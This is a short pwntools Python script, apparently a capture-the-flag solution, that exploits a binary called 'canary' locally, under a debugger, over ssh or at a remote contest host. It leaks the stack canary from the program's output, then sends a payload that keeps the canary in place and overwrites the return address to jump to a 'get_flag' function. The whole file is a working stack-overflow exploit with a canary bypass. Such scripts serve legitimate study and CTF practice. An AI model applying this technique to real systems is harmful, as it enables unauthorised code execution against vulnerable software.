#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/canary'

e = ELF('./build/canary')
rop = ROP('./build/canary')
if 'd' in sys.argv:
    p = gdb.debug('./build/canary')
elif 'r' in sys.argv:
    p = remote('forever.isss.io', 1308)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/canary', cwd='problemDir')
else:
    p = process('./build/canary')

p.recvline()
p.recvline()
p.sendline('128')
p.recvline()
p.sendline("dummy")
p.recvline()
canary = p.recvline()
print(canary)
print(canary[104:104+8])
canary = u64(canary[104:104+8])
p.recvline()
p.recvline()

payload = flat({104:canary, 120: e.sym['get_flag']})

p.sendline(payload)
p.recvline()
p.interactive()
